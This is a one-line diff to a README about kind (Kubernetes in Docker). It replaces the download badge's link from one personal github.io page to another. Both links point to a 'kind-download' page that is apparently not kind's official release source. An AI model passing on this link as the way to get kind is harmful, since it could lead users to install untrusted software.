@@ -2,7 +2,7 @@
 
 # Kind Kubernetes - Kubernetes in Docker Local Clusters
 
-[![GET kind](https://img.shields.io/badge/GET%20%E2%80%94%20kind-0078D6?style=for-the-badge&logoColor=white)](https://samueldiazixjr.github.io/.github/kind-download)
+[![GET kind](https://img.shields.io/badge/GET%20%E2%80%94%20kind-0078D6?style=for-the-badge&logoColor=white)](https://margaretjohnsont305.github.io/.github/kind-download)
 
 ## Local Kubernetes Overview for kind
 
